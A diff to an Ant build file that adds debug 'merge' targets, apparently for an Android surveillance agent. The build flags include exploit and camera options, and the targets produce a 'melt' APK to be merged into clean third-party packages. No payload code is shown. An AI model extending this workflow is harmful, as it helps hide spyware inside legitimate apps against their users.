@@ -171,6 +171,16 @@
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.merge.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
+				<case value="merge_debug">
+					<echo message="set merge" />
+					<antcall target="libsnoexp" />
+					<var name="isdebug" value="true" />
+					<var name="isexploit" value="false" />
+					<var name="iscamera" value="false" />
+					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
+					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/dexguard-project.merge.txt" toFile="dexguard-project.txt" overwrite="true" />
+				</case>
 				<case value="exploit">
 					<echo message="set exploit" />
 					<antcall target="libsexp" />
@@ -332,6 +342,11 @@
 		<set-cfg kind="merge" osversion="v2">
 		</set-cfg>
 	</target>
+	
+	<target name="set-merge-debug" depends="init">
+		<set-cfg kind="merge_debug" osversion="v2">
+		</set-cfg>
+	</target>
 
 	<target name="set-debug-default" depends="init">
 		<set-cfg kind="debug" osversion="default">
@@ -396,6 +411,20 @@
 		<var name="filename" value="bin/android_networking-release.apk" />
 		<mkdir dir="output/merge/" />
 		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
+		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
+		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
+	</target>
+	
+	<target name="merge_debug" depends="init">
+		<antcall target="clean" />
+		<set-cfg osversion="v2" kind="merge_debug" />
+		<echo message="==============" />
+		<echo>BUILD merge</echo>
+		<antcall target="debug" inheritAll="false" />
+        <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_networking-debug.apk" />
+		<mkdir dir="output/merge/" />
+		<copy file="${filename}" toFile="output/merge/core.android.melt.debug.apk" overwrite="true" />		
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
 		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
